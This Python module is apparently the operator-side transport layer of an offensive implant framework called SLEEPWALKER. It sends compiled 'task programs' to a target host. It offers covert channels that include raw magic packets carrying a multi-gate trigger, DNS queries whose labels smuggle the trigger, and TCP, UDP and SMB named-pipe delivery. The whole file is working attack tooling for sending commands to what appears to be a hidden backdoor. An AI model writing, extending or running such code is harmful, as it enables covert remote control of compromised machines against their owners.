"""Sending a compiled SLEEPWALKER task program to a target over a transport.

  magic  : raw IP packet carrying the six-gate trigger (requires scapy)
  dns    : crafted DNS A-query to UDP/53 carrying the trigger label
  tcp    : connect + 2-byte length + envelope
  udp    : datagram = envelope
  pipe   : SMB named pipe (Windows/remote SMB only - not supported here)

Every transport is outbound from the operator to the target's interface.
"""

from __future__ import annotations

import socket

from . import framing


def _require_scapy():
    try:
        import scapy.all as scapy  # noqa: PLC0415
        return scapy
    except ImportError as exc:  # pragma: no cover
        raise SystemExit(
            "magic-packet transport needs 'scapy' (pip install scapy)"
        ) from exc


def send_magic(program: bytes, dst: str) -> None:
    scapy = _require_scapy()
    pkt = framing.build_magic_packet(program)
    scapy.send(scapy.IP(dst=dst) / scapy.Raw(load=pkt), verbose=False)


def send_dns(program: bytes, dst: str, port: int = 53) -> None:
    """Send a DNS A-query whose first label carries the trigger."""
    qname = framing.dns_label(program)
    labels = qname.split(".")
    q = bytearray()
    q += (0x1234).to_bytes(2, "big")   # txid (ignored)
    q += (0x0100).to_bytes(2, "big")   # flags: RD
    q += (1).to_bytes(2, "big")        # QDCOUNT
    q += (0).to_bytes(2, "big")        # ANCOUNT
    q += (0).to_bytes(2, "big")        # NSCOUNT
    q += (0).to_bytes(2, "big")        # ARCOUNT
    for lbl in labels:
        b = lbl.encode("ascii")
        if len(b) > 63:
            raise ValueError("DNS label exceeds 63 bytes")
        q.append(len(b))
        q += b
    q.append(0)
    q += (1).to_bytes(2, "big")        # QTYPE A
    q += (1).to_bytes(2, "big")        # QCLASS IN
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
        s.sendto(bytes(q), (dst, port))


def send_tcp(program: bytes, dst: str, port: int) -> None:
    with socket.create_connection((dst, port), timeout=10) as s:
        s.sendall(framing.tcp_frame(program))


def send_udp(program: bytes, dst: str, port: int) -> None:
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
        s.sendto(framing.udp_datagram(program), (dst, port))


def send_pipe(program: bytes, server: str, pipe: str) -> None:
    raise SystemExit(
        "named-pipe transport requires a Windows host or remote SMB; "
        "not supported from this platform"
    )


SENDERS = {
    "magic": send_magic,
    "dns": send_dns,
    "tcp": send_tcp,
    "udp": send_udp,
    "pipe": send_pipe,
}
